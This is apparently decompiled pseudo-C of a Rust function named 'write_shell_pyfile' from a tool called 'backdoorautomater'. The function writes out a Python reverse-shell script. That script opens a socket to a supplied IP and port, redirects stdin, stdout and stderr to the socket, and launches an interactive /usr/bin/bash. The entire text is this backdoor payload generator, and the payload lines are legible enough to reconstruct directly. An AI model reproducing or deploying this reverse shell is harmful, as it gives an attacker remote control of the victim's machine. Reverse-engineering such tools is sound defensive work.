long _ZN17backdoorautomater10newservice18write_shell_pyfile17h388a3bef0a7e09fcE
               (long param_1,long param_2)

{
  long lVar1;
  int local_8c;
  undefined8 local_88;
  long local_80;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 local_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined8 local_58;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined8 local_38;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined8 local_20;
  
                    /* try { // try from 001597f2 to 00159807 has its CatchHandler @ 00159abe */
  _ZN3std2fs4File6create17hf69a1aea5d21dd7bE(&local_88,&DAT_0026618d,0x12);
  lVar1 = local_80;
  if ((int)local_88 == 0) {
    local_8c = local_88._4_4_;
                    /* try { // try from 00159821 to 0015989f has its CatchHandler @ 00159aab */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                      (&local_8c,"import socket,subprocess,os;\n",0x1d);
    if ((lVar1 == 0) &&
       (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_8c,"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n",0x34),
       lVar1 == 0)) {
      local_78 = *(undefined4 *)(param_2 + 8);
      uStack_74 = *(undefined4 *)(param_2 + 0xc);
      uStack_70 = *(undefined4 *)(param_2 + 0x10);
      uStack_6c = *(undefined4 *)(param_2 + 0x14);
      local_88 = "v_ip=\'";
      local_80 = 6;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
      local_58 = local_20;
      local_68 = local_30;
      uStack_64 = uStack_2c;
      uStack_60 = uStack_28;
      uStack_5c = uStack_24;
                    /* try { // try from 001598b4 to 00159923 has its CatchHandler @ 00159a9c */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_68,"\';\n",3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_8c,CONCAT44(uStack_5c,uStack_60),local_58);
      if (lVar1 == 0) {
        local_78 = *(undefined4 *)(param_1 + 8);
        uStack_74 = *(undefined4 *)(param_1 + 0xc);
        uStack_70 = *(undefined4 *)(param_1 + 0x10);
        uStack_6c = *(undefined4 *)(param_1 + 0x14);
        local_88 = "s.connect((v_ip,\x02";
        local_80 = 0x10;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
        local_38 = local_20;
        local_48 = local_30;
        uStack_44 = uStack_2c;
        uStack_40 = uStack_28;
        uStack_3c = uStack_24;
                    /* try { // try from 00159938 to 00159a1d has its CatchHandler @ 00159a8d */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_48,&DAT_00265a9f,4);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_8c,CONCAT44(uStack_3c,uStack_40),local_38);
        if ((((lVar1 == 0) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"os.dup2(s.fileno(),0);\n",0x17), lVar1 == 0)) &&
            (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                               (&local_8c,"os.dup2(s.fileno(),1);\n",0x17), lVar1 == 0)) &&
           (((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"os.dup2(s.fileno(),2);\n",0x17), lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_8c,"v_shell_path=\'/usr/bin/bash\';\n",0x1e), lVar1 == 0))
            && ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                   (&local_8c,"v_shell_value=\'-i\';\n",0x14), lVar1 == 0 &&
                (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                   (&local_8c,"p=subprocess.call([v_shell_path,v_shell_value]);\n",
                                    0x31), lVar1 == 0)))))) {
                    /* try { // try from 00159a63 to 00159a6c has its CatchHandler @ 00159a9c */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
                    /* try { // try from 00159a6d to 00159a76 has its CatchHandler @ 00159aab */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
                    /* try { // try from 00159a7b to 00159a7f has its CatchHandler @ 00159abe */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
                    /* try { // try from 00159a80 to 00159a87 has its CatchHandler @ 00159ab9 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_00159a4b;
        }
                    /* try { // try from 00159a26 to 00159a2f has its CatchHandler @ 00159a9c */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
      }
                    /* try { // try from 00159a30 to 00159a39 has its CatchHandler @ 00159aab */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
    }
                    /* try { // try from 00159a3e to 00159a42 has its CatchHandler @ 00159abe */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
  }
                    /* try { // try from 00159a43 to 00159a4a has its CatchHandler @ 00159ab9 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_00159a4b:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}